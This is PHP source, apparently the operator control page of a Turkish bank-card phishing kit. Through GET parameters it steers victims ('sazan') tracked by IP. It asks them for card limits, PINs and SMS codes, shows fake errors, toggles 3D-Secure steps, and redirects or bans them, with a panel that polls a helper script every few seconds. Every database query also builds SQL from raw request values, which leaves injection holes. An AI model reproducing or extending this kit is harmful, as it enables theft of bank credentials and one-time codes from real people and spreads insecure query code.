<?php

date_default_timezone_set('Europe/Istanbul');
include("../baglan.php");
$sorgula = $db->query("SELECT * FROM site WHERE id = '1'")->fetch(PDO::FETCH_ASSOC);
session_start();
if(!isset($_SESSION["login"])){
header('Location:login.php');
}else{
if(isset($_GET['limit'])){
$limit = $_GET['limit'];
$db->query("insert into max (max) values ( '$limit')");
echo "<script>alert('Limit istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['pin'])){
$pin = $_GET['pin'];
$db->query("insert into pin (pin) values ( '$pin')");
echo "<script>alert('Pin istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['sms'])){
$sms = $_GET['sms'];
$db->query("insert into sms (sms) values ( '$sms')");
echo "<script>alert('SMS istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['hata'])){
$hata = $_GET['hata'];
$db->query("insert into hata (hata) values ( '$hata')");
echo "<script>alert('Hata verildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['hatalisms'])){
$hatalisms = $_GET['hatalisms'];
$db->query("insert into sms2 (sms2) values ( '$hatalisms')");
echo "<script>alert('Hatalı SMS istendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['tebrik'])){
$tebrik = $_GET['tebrik'];
$db->query("insert into tebrik (tebrik) values ( '$tebrik')");
echo "<script>alert('Tebkriklendi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['tumu'])){
$tumu = $_GET['tumu'];
$db->query("truncate table sazan");
$db->query("truncate table hata");
$db->query("truncate table sms2");
$db->query("truncate table pin");
$db->query("truncate table max");
$db->query("truncate table tebrik");
$db->query("truncate table sms");
echo "<script>alert('Tüm veriler temizlendi & sıfırlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['bankaldir'])){
$db->query("truncate table ban");
echo "<script>alert('Tüm banlar kaldırıldı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['logout'])){
session_start();
ob_start();
session_unset();
session_destroy();
header('Location:index.php');
}
if(isset($_GET['sil'])){
$sil = $_GET['sil'];
$db->query("DELETE FROM sazan WHERE ip='$sil'");
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['ban'])){
$ban = $_GET['ban'];
$db->query("insert into ban (ban) values ( '$ban')");
echo "<script>alert('Sazan banlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['ban'])){
$ban = $_GET['ban'];
$db->query("insert into ban (ban) values ( '$ban')");
echo "<script>alert('Sazan banlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['priv'])){
$priv = $_GET['priv'];
$db->query("insert into priv (priv) values ( '$priv')");
echo "<script>alert('Kullanıcı Özel sayfanıza yönlendirildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['dondur'])){
$dondur = $_GET['dondur'];
$db->query("insert into back (back) values ( '$dondur')");
echo "<script>alert('Kullanıcı Sayfanın başına gönderildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['refresh'])){
$refresh = $_GET['refresh'];
$db->query("UPDATE site SET refresh = '$refresh' WHERE id = '1'");
echo "<script>alert('Yenilenme süresi ayarlandı!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['go'])){
$go = $_GET['go'];
$go_ip = $_GET['go_ip'];
$db->query("UPDATE sazan SET go = '{$go}' WHERE ip = '{$go_ip}'");
echo "<script>alert('Kullanıcı belirttiğiniz sayfaya yönlendirildi!');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['oto'])){
$oto = $_GET['oto'];
$db->query("UPDATE site SET 3d = '1'");
echo "<script>alert('3D AÇILDI');</script>";
echo "<script>window.location.href='index.php';</script>";
}
if(isset($_GET['noto'])){
$noto = $_GET['noto'];
$db->query("UPDATE site SET 3d = '0'");
echo "<script>alert('3D KAPATILDI');</script>";
echo "<script>window.location.href='index.php';</script>";
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
    <link href="https://fonts.googleapis.com/css?family=Hind+Madurai&display=swap" rel="stylesheet">
    <link href="https://use.fontawesome.com/releases/v5.0.7/css/all.css" rel="stylesheet">
	<title>Vırevle Panel</title>
    <link rel="icon" type="image/png" href="../files/ico.png">
    <link type="text/css" rel="stylesheet" href="./css/fatal.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style>
	.table {
		margin-bottom: 0px;
	}
	</style>
</head>
<body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
<script type="text/javascript">
$(document).ready(function() {
    gonder();
    var int=self.setInterval("gonder()",4000);
});
 
function gonder(){
    $.ajax({
        type:'POST',
        url:'bozkurtroot.php',
        success: function (msg) {
            $("#sonuc").html(msg);
        }
    });
}
</script>
			<div id="sonuc"></div>
</body>
</html>
<?php } ?>